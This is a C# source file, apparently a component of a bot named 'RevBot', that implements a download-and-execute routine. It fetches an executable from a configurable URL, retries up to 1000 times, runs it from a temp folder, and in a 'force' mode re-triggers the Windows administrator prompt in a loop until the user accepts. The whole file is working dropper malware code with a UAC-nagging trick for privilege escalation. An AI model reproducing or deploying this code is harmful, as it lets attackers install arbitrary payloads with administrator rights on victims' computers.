using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace RevBot1
{
    internal class dlexec
    {
        public string url = "http://localhost/RevBot/exemple.exe";
        public string extension = "exe";
        public string runtype = "admin";

        public static void Load()
        {

        }

        public void DownloadAndRun()
        {
            const int maxAttempts = 1000; // Nombre maximum de tentatives de téléchargement
            int attempts = 0;

            while (attempts < maxAttempts)
            {
                try
                {
                    // Incrémenter le nombre de tentatives
                    attempts++;

                    // Télécharger le fichier depuis l'URL spécifiée
                    string tempFilePath = Path.GetTempFileName();
                    string tempExePath = Path.ChangeExtension(tempFilePath, extension);
                    using (WebClient client = new WebClient())
                    {
                        client.DownloadFile(url, tempExePath);
                        Console.WriteLine("File Downloaded.");
                        Console.WriteLine("File Path: " + tempExePath);
                    }

                    // Vérifier si le fichier a bien été téléchargé
                    if (File.Exists(tempExePath))
                    {
                        // Exécuter le fichier téléchargé
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = tempExePath;

                        // Vérifier le type d'exécution
                        if (runtype == "admin")
                        {
                            psi.Verb = "runas"; // Exécuter en tant qu'administrateur
                            Console.WriteLine("Running as administrator.");
                        }
                        else if (runtype == "force")
                        {
                            Console.WriteLine("Running as force.");
                            // Exécuter en tant qu'administrateur en boucle jusqu'à ce que l'utilisateur clique sur "Oui"
                            while (true)
                            {
                                psi.Verb = "runas"; // Exécuter en tant qu'administrateur
                                Process process = Process.Start(psi);
                                process.WaitForExit();
                                int exitCode = process.ExitCode;

                                // Vérifier si l'utilisateur a cliqué sur "Oui" pour exécuter en tant qu'administrateur
                                if (exitCode == 0)
                                    break;
                            }
                        }
                        else
                        {
                            // Si le type d'exécution n'est ni "admin" ni "force", exécuter normalement
                            Process.Start(psi);
                            Console.WriteLine("Running normally.");
                        }

                        break; // Sortir de la boucle si le téléchargement et l'exécution réussissent
                    }
                    else
                    {
                        Console.WriteLine("Erreur : Le fichier téléchargé n'existe pas.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Erreur lors du téléchargement et de l'exécution (tentative {attempts}): {ex.Message}");
                    if (attempts < maxAttempts)
                    {
                        Console.WriteLine("Réessayer...");
                    }
                    else
                    {
                        Console.WriteLine("Nombre maximal de tentatives atteint. Arrêt des tentatives.");
                    }
                }
            }
        }
    }
}
